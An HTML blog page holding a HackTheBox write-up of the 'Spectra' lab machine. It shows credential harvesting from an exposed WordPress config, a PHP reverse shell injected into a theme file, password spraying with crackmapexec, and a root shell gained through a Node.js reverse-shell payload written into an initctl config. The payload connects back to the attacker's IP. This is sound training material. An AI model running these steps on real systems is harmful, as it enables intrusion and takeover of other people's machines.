<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Spectra | Ef's log</title><meta name=keywords content="HackTheBox,CTF,Cyber Security,Pentesting"><meta name=description content="Getting password from automatic login script of ChromeOS"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/spectra/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Spectra"><meta property="og:description" content="Getting password from automatic login script of ChromeOS"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/spectra/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/spectra/imgs/image-20210626220935655.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-06-26T21:27:14+07:00"><meta property="article:modified_time" content="2021-06-26T21:27:14+07:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/spectra/imgs/image-20210626220935655.png"><meta name=twitter:title content="HackTheBox - Spectra"><meta name=twitter:description content="Getting password from automatic login script of ChromeOS"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Spectra","item":"https://fahmifj.github.io/hackthebox/spectra/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Spectra","name":"HackTheBox - Spectra","description":"Getting password from automatic login script of ChromeOS","keywords":["HackTheBox","CTF","Cyber Security","Pentesting"],"articleBody":"Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a WordPress website, which has a directory listing enabled, thus exposing its source code. Examining the source reveals a database password that is reused by the wordpress admin. With administrator access, I’m able to inject a PHP code into a theme file to get a foothold on the system. Enumerating the internal discovers an auto-login password, and it is reused by a user. The user has sudo permissions on initctl, which can be exploited to get a root shell.\nSkills Learned WordPress exploitation Command injection Sudo exploitation on initctl Tools Nmap CrackMapExec Reconnaissance Nmap nmap full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.\n→ root@kali «spectra» «10.10.14.21» $ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-15 10:10 EDT Nmap scan report for 10.10.10.229 Host is up, received echo-reply ttl 63 (0.052s latency). Not shown: 65532 closed ports Reason: 65532 resets PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.1 (protocol 2.0) 80/tcp open http syn-ack ttl 63 nginx 1.17.4 3306/tcp open mysql syn-ack ttl 63 MySQL (unauthorized) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 123.14 seconds MySQL service is normally tied to 127.0.0.1, but nmap already identified that I have no access there.\nRunning a script scan didn’t find any interesting information.\nEnumeration TCP 80 - spectra.htb The site appears to be under development.\nInspecting page source discovers a hostname and two directories:\nhttp://spectra.htb/main/index.php http://spectra.htb/testing/index.php I’ll update my /etc/hosts with the hostname.\n→ root@kali «spectra» «10.10.14.21» $ echo '10.10.10.229 spectra.htb' \u003e\u003e /etc/hosts Poking with curl, shows that with or without the hostname it’s the same site.\n→ root@kali «~» «10.10.14.9» $ curl -s http://spectra.htb/ | wc -c 283 → root@kali «~» «10.10.14.9» $ curl -s http://10.10.10.229 | wc -c 283 Clicking on “Software Issue Tracker”, redirects to a WordPress site and nothing interesting except one default post by administrator.\nVisiting “Test”, the site page shows an error message about database connection.\nRemoving index.php from URL, reveals that this page has directory listing enabled.\nThe wp-config.php.save file draws my attention. It contains a set of database credentials.\n→ root@kali «spectra» «10.10.14.21» $ curl http://spectra.htb/testing/wp-config.php.save \u003c?php ...... define( 'DB_NAME', 'dev' ); /** MySQL database username */ define( 'DB_USER', 'devtest' ); /** MySQL database password */ define( 'DB_PASSWORD', 'devteam01' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); ...... Foothold Shell as nginx WP-Admin Dashboard The database password works with administrator account (administrator:devteam01), it allows me to access the admin dashboard.\nInjecting Reverse Shell Armed with administrator access, I can inject a malicious PHP code into one of the available themes files and execute it by visiting the full URL of the theme file. In this case, I’ll inject a reverse shell script in 404.php file of the Twenty Nineteen theme. The file can be found at Appearance \u003e Theme Editor.\nI’ll access this URL to get a shell: http://spectra.htb/main/wp-content/themes/twentynineteen/404.php, but it returns an error message pointing on line 12.\nI’m able to resolve the error by commenting out the line 12.\nThis time, I’ll trigger the reverse shell using curl.\n→ root@kali «spectra» «10.10.14.21» $ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php On my listener.\n→ root@kali «spectra» «10.10.14.21» $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.21] from (UNKNOWN) [10.10.10.229] 35166 Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux 09:14:42 up 10:53, 0 users, load average: 0.02, 0.04, 0.00 USER TTY LOGIN@ IDLE JCPU PCPU WHAT uid=20155(nginx) gid=20156(nginx) groups=20156(nginx) $ hostname spectra Shell upgrade My current shell doesn’t have PATH variable set, so I have to use the full path to upgrade my shell.\n$ which python3 which: no python3 in ((null)) $ ls /usr/bin/ | grep python python python-config python-wrapper python2 python2.7 python3 python3.6 python3.6m $ /usr/bin/python3 -c 'import pty;pty.spawn(\"/bin/bash\")' nginx@spectra / $ export TERM=xterm nginx@spectra / $ ^Z [1] + 7285 suspended nc -nvlp 9001 → root@kali «spectra» «10.10.14.21» $ stty raw -echo; fg [1] + 7285 continued nc -nvlp 9001 nginx@spectra / $ To resolve the ((null)) message, I’ll add /usr/bin to current PATH variable.\nnginx@spectra / $ env TERM=xterm USER=nginx PWD=/ SHLVL=1 HOME=/home/nginx _=/usr/bin/env nginx@spectra / $ export PATH=$PATH:/usr/bin nginx@spectra / $ which python /usr/local/bin/python Privilege Escalation Shell as katie Internal Enumeration There are 4 users with login shell in this machine.\nnginx@spectra / $ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash nginx:x:20155:20156::/home/nginx:/bin/bash katie:x:20156:20157::/home/katie:/bin/bash Enumerating home directory shows the user flag is on katie’s home directory.\nnginx@spectra / $ ls -lR /home 2\u003e/dev/null ...... /home/katie: total 8 drwxr-xr-x 2 katie katie 4096 Jan 15 15:55 log -r-------- 1 katie katie 33 Feb 2 15:57 user.txt ...... All the web files are located in /usr/local/share/nginx/html/.\nnginx@spectra / $ find / -type f -name wp-config.php 2\u003e/dev/null /usr/local/share/nginx/html/main/wp-config.php /usr/local/share/nginx/html/testing/wp-config.php /mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php /mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php The wp-config.php file for /main has different credentials with the one on /testing. I’ll grab these credentials.\nnginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php ...... // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define( 'DB_NAME', 'dev' ); /** MySQL database username */ define( 'DB_USER', 'dev' ); /** MySQL database password */ define( 'DB_PASSWORD', 'development01' ); ...... In /opt, there is a file with uncommon extension called autologin.conf.orig.\nnginx@spectra /opt $ cat autologin.conf.orig # Copyright 2016 The Chromium OS Authors. All rights reserved. # Use of this source code is governed by a BSD-style license that can be # found in the LICENSE file. description \"Automatic login at boot\" author \"chromium-os-dev@chromium.org\" # After boot-complete starts, the login prompt is visible and is accepting # input. start on started boot-complete script passwd= # Read password from file. The file may optionally end with a newline. for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do if [ -e \"${dir}/passwd\" ]; then passwd=\"$(cat \"${dir}/passwd\")\" break fi done if [ -z \"${passwd}\" ]; then exit 0 fi ...... Based on the comments, the file is an autologin script. It looks for passwd file in these directories:\n/mnt/stateful_partition/etc/autologin /etc/autologin And the passwd file in /etc/autologin/ directory contains a password.\nnginx@spectra /opt $ ls -l /etc/autologin/ total 4 -rw-r--r-- 1 root root 19 Feb 3 16:43 passwd nginx@spectra /opt $ cat /etc/autologin/passwd SummerHereWeCome!! SSH - katie I’ll spray SummerHereWeCome!! and development01 using crackmapexec to the users who have login shell. Within a few sec, it returns that katie:SummerHereWeCome!! are the valid credentials.\n→ root@kali «spectra» «10.10.14.21» $ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list SSH 10.10.10.229 22 10.10.10.229 [*] SSH-2.0-OpenSSH_8.1 SSH 10.10.10.229 22 10.10.10.229 [-] chronos:devteam01 Bad authentication type; allowed types: ['publickey', 'keyboard-interactive'] SSH 10.10.10.229 22 10.10.10.229 [-] chronos:development01 Bad authentication type; allowed types: ['publickey', 'keyboard-interactive'] SSH 10.10.10.229 22 10.10.10.229 [-] chronos:SummerHereWeCome!! Bad authentication type; allowed types: ['publickey', 'keyboard-interactive'] SSH 10.10.10.229 22 10.10.10.229 [-] katie:devteam01 Bad authentication type; allowed types: ['publickey', 'keyboard-interactive'] SSH 10.10.10.229 22 10.10.10.229 [-] katie:development01 Bad authentication type; allowed types: ['publickey', 'keyboard-interactive'] SSH 10.10.10.229 22 10.10.10.229 [+] katie:SummerHereWeCome!! I’m able to login via SSH\n→ root@kali «spectra» «10.10.14.21» $ ssh katie@10.10.10.229 Password: katie@spectra ~ $ id uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers) User flag is done here.\nkatie@spectra ~ $ ls -la total 36 drwxr-xr-x 5 katie katie 4096 May 15 12:17 . drwxr-xr-x 8 root root 4096 Feb 2 15:55 .. lrwxrwxrwx 1 root root 9 Feb 2 15:55 .bash_history -\u003e /dev/null -rw-r--r-- 1 katie katie 127 Dec 22 05:46 .bash_logout -rw-r--r-- 1 katie katie 204 Dec 22 05:46 .bash_profile -rw-r--r-- 1 katie katie 551 Dec 22 05:46 .bashrc drwx------ 2 katie katie 4096 May 15 12:17 .gnupg drwx------ 3 katie katie 4096 Jan 15 15:55 .pki drwxr-xr-x 2 katie katie 4096 Jan 15 15:55 log -r-------- 1 katie katie 33 Feb 2 15:57 user.txt Shell as root Internal Enumeration The first thing I will check if I have the user’s password is the sudo rights, and this user has one on initctl. Unfortunately, initctl is not listed on GTFObins site, so I’ll have to look around.\nkatie@spectra ~ $ sudo -l User katie may run the following commands on spectra: (ALL) SETENV: NOPASSWD: /sbin/initctl Enumerating for files owned by developers discovers some writable .conf files and a JavaScript file.\nkatie@spectra ~ $ find / -type f -group developers -ls 2\u003e/dev/null 32121 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test6.conf 32123 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test7.conf 32109 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test3.conf 32112 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test4.conf 32103 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test.conf 32126 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test8.conf 32128 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test9.conf 32106 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test10.conf 32108 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test2.conf 32120 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test5.conf 32105 4 -rw-rw---- 1 root developers 478 Jun 29 2020 /etc/init/test1.conf 23763 4 -rwxrwxr-x 1 root developers 251 Jun 29 2020 /srv/nodetest.js These .conf files are configuration scripts to start /srv/nodetest.js. The JS file itself is not that important here.\nkatie@spectra ~ $ cat /etc/init/test.conf description \"Test node.js server\" author \"katie\" start on filesystem or runlevel [2345] stop on shutdown script export HOME=\"/srv\" echo $$ \u003e /var/run/nodetest.pid exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js end script pre-start script echo \"[`date`] Node Test Starting\" \u003e\u003e /var/log/nodetest.log end script pre-stop script rm /var/run/nodetest.pid echo \"[`date`] Node Test Stopping\" \u003e\u003e /var/log/nodetest.log end script Abusing sudo initctl With sudo privileges and write access on the configuration files, I can perform a command injection to send myself a root shell.\nIn this write-up, I’d like to try injecting a node reverse shell.\nFirst, I’ll create a copy of the configuration file, which contains reverse shell to my machine and it is without the pre and post script part. I’ll name it exploit.conf:\n→ root@kali «exploits» «10.10.14.21» $ cat exploit.conf description \"Test node.js server\" author \"katie\" start on filesystem or runlevel [2345] stop on shutdown script export HOME=\"/srv\" echo $$ \u003e /var/run/nodetest.pid export RHOST=10.10.14.21 export RPORT=9001 exec /usr/local/share/nodebrew/node/v8.9.4/bin/node -e 'sh = child_process.spawn(\"/bin/sh\"); net.connect(process.env.RPORT, process.env.RHOST, function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })' exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js end script After that, I’ll transfer the file to Spectra in /dev/shm directory.\n→ root@kali «exploits» «10.10.14.21» $ scp exploit.conf katie@10.10.10.229:/dev/shm Password: bash: warning: /home/katie/.bashrc: warning: script from noexec mount; see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md exploit.conf 100% 775 13.1KB/s 00:00 I’ll setup a nc listener on my Kali and execute the following command.\nkatie@spectra /etc/init $ sudo /sbin/initctl stop test5 2\u003e/dev/null; cat /dev/shm/exploit.conf \u003e test5.conf \u0026\u0026 sudo /sbin/initctl start test5 test5 start/running, process 33889 If I check my listener, I have a root shell now.\n→ root@kali «spectra» «10.10.14.21» $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.21] from (UNKNOWN) [10.10.10.229] 37220 id \u0026\u0026 hostname \u0026\u0026 ip a uid=0(root) gid=0(root) groups=0(root) spectra 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:50:56:b9:0b:2c brd ff:ff:ff:ff:ff:ff inet 10.10.10.229/24 brd 10.10.10.255 scope global eth0 valid_lft forever preferred_lft forever inet6 dead:beef::15c7:10de:7382:baf8/64 scope global temporary dynamic valid_lft 86303sec preferred_lft 14303sec inet6 dead:beef::250:56ff:feb9:b2c/64 scope global dynamic mngtmpaddr valid_lft 86303sec preferred_lft 14303sec inet6 fe80::250:56ff:feb9:b2c/64 scope link valid_lft forever preferred_lft forever ","wordCount":"1925","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/spectra/imgs/image-20210626220935655.png","datePublished":"2021-06-26T21:27:14+07:00","dateModified":"2021-06-26T21:27:14+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/spectra/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Spectra</h1><p class=post-description>Getting password from automatic login script of ChromeOS</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>June 26, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>10 min read</span></div><hr></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---spectrahtb aria-label="TCP 80 - spectra.htb">TCP 80 - spectra.htb</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-nginx aria-label="Shell as nginx">Shell as nginx</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-katie aria-label="Shell as katie">Shell as katie</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/spectra/imgs/image-20210626220935655_hub31e111185efb7849adba126f1f5278f_173397_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/spectra/imgs/image-20210626220935655_hub31e111185efb7849adba126f1f5278f_173397_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/spectra/imgs/image-20210626220935655_hub31e111185efb7849adba126f1f5278f_173397_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/spectra/imgs/image-20210626220935655.png 742w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/spectra/imgs/image-20210626220935655.png alt="HackTheBox - Spectra" width=742 height=459><p>HackTheBox - Spectra</p></figure><p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a WordPress website, which has a directory listing enabled, thus exposing its source code. Examining the source reveals a database password that is reused by the wordpress admin. With administrator access, I&rsquo;m able to inject a PHP code into a theme file to get a foothold on the system. Enumerating the internal discovers an auto-login password, and it is reused by a user. The user has sudo permissions on <code>initctl</code>, which can be exploited to get a root shell.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>WordPress exploitation</li><li>Command injection</li><li>Sudo exploitation on initctl</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>CrackMapExec</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p><code>nmap</code> full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «spectra» «10.10.14.21» 
</span></span><span class=line><span class=cl>$ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-05-15 10:10 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.229
</span></span><span class=line><span class=cl>Host is up, received echo-reply ttl <span class=m>63</span> <span class=o>(</span>0.052s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65532</span> closed ports
</span></span><span class=line><span class=cl>Reason: <span class=m>65532</span> resets
</span></span><span class=line><span class=cl>PORT     STATE SERVICE REASON         VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     syn-ack ttl <span class=m>63</span> OpenSSH 8.1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp   open  http    syn-ack ttl <span class=m>63</span> nginx 1.17.4
</span></span><span class=line><span class=cl>3306/tcp open  mysql   syn-ack ttl <span class=m>63</span> MySQL <span class=o>(</span>unauthorized<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 123.14 seconds
</span></span></code></pre></div><p>MySQL service is normally tied to 127.0.0.1, but <code>nmap</code> already identified that I have no access there.</p><p>Running a script scan didn&rsquo;t find any interesting information.</p><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---spectrahtb>TCP 80 - spectra.htb<a class=anchor aria-hidden=true href=#tcp-80---spectrahtb>#</a></h3><p>The site appears to be under development.</p><p><div class=img-container><img src=imgs/image-20210515212024368.png alt=image-20210515212024368></div></p><p>Inspecting page source discovers a hostname and two directories:</p><ul><li><a href=http://spectra.htb/main/index.php>http://spectra.htb/main/index.php</a></li><li><a href=http://spectra.htb/testing/index.php>http://spectra.htb/testing/index.php</a></li></ul><p><div class=img-container><img src=imgs/image-20210515212038877.png alt=image-20210515212038877></div></p><p>I&rsquo;ll update my <code>/etc/hosts</code> with the hostname.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «spectra» «10.10.14.21» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.229 spectra.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><p>Poking with <code>curl</code>, shows that with or without the hostname it&rsquo;s the same site.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>→ root@kali «~» «10.10.14.9» 
</span></span><span class=line><span class=cl>$ curl -s http://spectra.htb/ <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>283</span>
</span></span><span class=line><span class=cl>→ root@kali «~» «10.10.14.9» 
</span></span><span class=line><span class=cl>$ curl -s http://10.10.10.229 <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>283</span>
</span></span></code></pre></div><p>Clicking on &ldquo;<strong>Software Issue Tracker</strong>&rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.</p><p><div class=img-container><img src=imgs/image-20210626224157109.png alt=image-20210626224157109></div></p><p>Visiting &ldquo;<strong>Test</strong>&rdquo;, the site page shows an error message about database connection.</p><p><div class=img-container><img src=imgs/image-20210515214125642.png alt=image-20210515214125642></div></p><p>Removing <code>index.php</code> from URL, reveals that this page has directory listing enabled.</p><p><div class=img-container><img src=imgs/image-20210515221118144.png alt=image-20210515221118144></div></p><p>The <code>wp-config.php.save</code> file draws my attention. It contains a set of database credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «spectra» «10.10.14.21» 
</span></span><span class=line><span class=cl>$ curl http://spectra.htb/testing/wp-config.php.save
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>define<span class=o>(</span> <span class=s1>&#39;DB_NAME&#39;</span>, <span class=s1>&#39;dev&#39;</span> <span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/** MySQL database username */
</span></span><span class=line><span class=cl>define<span class=o>(</span> <span class=s1>&#39;DB_USER&#39;</span>, <span class=s1>&#39;devtest&#39;</span> <span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/** MySQL database password */
</span></span><span class=line><span class=cl>define<span class=o>(</span> <span class=s1>&#39;DB_PASSWORD&#39;</span>, <span class=s1>&#39;devteam01&#39;</span> <span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/** MySQL hostname */
</span></span><span class=line><span class=cl>define<span class=o>(</span> <span class=s1>&#39;DB_HOST&#39;</span>, <span class=s1>&#39;localhost&#39;</span> <span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>...&lt;SNIP&gt;...
</span></span></code></pre></div><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-nginx>Shell as nginx<a class=anchor aria-hidden=true href=#shell-as-nginx>#</a></h3><h4 id=wp-admin-dashboard>WP-Admin Dashboard<a class=anchor aria-hidden=true href=#wp-admin-dashboard>#</a></h4><p>The database password works with administrator account (<code>administrator:devteam01</code>), it allows me to access the admin dashboard.</p><p><div class=img-container><img src=imgs/image-20210626225944808.png alt=image-20210626225944808></div></p><h4 id=injecting-reverse-shell>Injecting Reverse Shell<a class=anchor aria-hidden=true href=#injecting-reverse-shell>#</a></h4><p>Armed with administrator access, I can inject a malicious PHP code into one of the available themes files and execute it by visiting the full URL of the theme file. In this case, I&rsquo;ll inject a <a href=https://github.com/pentestmonkey/php-reverse-shell>reverse shell</a> script in <code>404.php</code> file of the Twenty Nineteen theme. The file can be found at <strong>Appearance</strong> > <strong>Theme Editor</strong>.</p><p><div class=img-container><img src=imgs/image-20210515231108016.png alt=image-20210515231108016></div></p><p>I&rsquo;ll access this URL to get a shell: <code>http://spectra.htb/main/wp-content/themes/twentynineteen/404.php</code>, but it returns an error message pointing on line 12.</p><p><div class=img-container><img src=imgs/image-20210515231346411.png alt=image-20210515231346411></div></p><p>I&rsquo;m able to resolve the error by commenting out the line 12.</p><p><div class=img-container><img src=imgs/image-20210515231422348.png alt=image-20210515231422348></div></p><p>This time, I&rsquo;ll trigger the reverse shell using <code>curl</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «spectra» «10.10.14.21» 
</span></span><span class=line><span class=cl>$ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
